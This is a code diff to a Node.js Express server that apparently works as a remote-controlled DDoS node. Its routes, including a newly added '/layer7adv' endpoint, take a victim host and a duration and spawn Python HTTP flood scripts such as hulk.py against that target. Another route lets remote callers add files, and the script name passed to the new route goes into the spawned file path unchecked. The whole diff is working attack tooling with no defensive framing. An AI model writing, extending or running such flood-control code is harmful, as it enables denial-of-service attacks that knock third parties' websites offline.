@@ -3,11 +3,10 @@ const { spawn } = require('child_process');
 const app = express()
 const delay = require('delay')
 const axios = require('axios')
+var fs = require('fs')
 const lockdown = false
 const port = 3000 // access port
 const managerIP = "" //only IP that can send commands in if lockdown === true.
-var http = require('http')
-var fs = require('fs')
 
 
 let machineBusy = false //machine attack state declaration
@@ -25,10 +24,9 @@ function inithb() {
     });
 }
 inithb()
+
 app.use((req, res, next) => {
     var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-    var accessedPN = req.originalUrl;
-    var accesstype = req.method
     res.setHeader('Acces-Control-Allow-Origin', '*');
     res.setHeader('Acces-Control-Allow-Methods', 'GET,POST,PUT,PATCH,DELETE');
     res.setHeader('Acces-Contorl-Allow-Methods', 'Content-Type', 'Authorization');
@@ -58,6 +56,32 @@ app.get('/layer7/:victim/:time', (req, res) => {
     }
 })
 
+app.get('/layer7adv/:victim/:time/:script', (req, res) => {
+    if (!(machineBusy)) {
+        let victim_ = req.params.victim
+        let victim = (victim_.replace(/ç/g, "/"))
+
+        let timelimit = req.params.time
+        let script = req.params.script
+        if (isNaN(timelimit)) {
+            res.send(405, { error: "INVALID_TIME_LIMIT" })
+        }
+        else {
+            if (!(script.includes(".py"))){
+                advancedPython(victim, timelimit, script)
+                machineBusy = true
+                res.send(200, { success: `Attacking ${victim} with TL ${timelimit}` })
+            }
+            else{
+                res.send(405, { error: "INVALID_SCRIPT_NAME" })
+            }
+
+        }
+    }
+    else {
+        res.send(405, { error: "MACHINE_IS_BUSY" })
+    }
+})
 
 
 
@@ -89,6 +113,8 @@ app.get('/addfile/:fin/:exn/', (req, res) => {
     res.send(200)
 })
 
+
+
 app.get('/listdir/', (req, res) => {
     let folderarr = []
     const testFolder = './';
@@ -119,6 +145,25 @@ async function mainT(victim, time) {
         machineBusy = true
         pythonActive = true
         python = spawn('/usr/bin/python2', ['/home/ubuntu/l7flood/hulk.py', `http://${victim}`]);
+
+        machineBusy = true
+        pythonActive = true
+        await delay(time * 1000)
+        if (pythonActive) {
+            python.kill("SIGINT")
+            python.kill("SIGTERM")
+            console.log("KILLED PYTHON.")
+            machineBusy = false
+            pythonActive = false
+        }
+    }
+}
+
+async function advancedPython(victim, time, scriptname) {
+    if (!(pythonActive)) {
+        machineBusy = true
+        pythonActive = true
+        python = spawn('/usr/bin/python2', [`/home/ubuntu/l7flood/${scriptname}.py`, `http://${victim}`]);
 
         machineBusy = true
         pythonActive = true
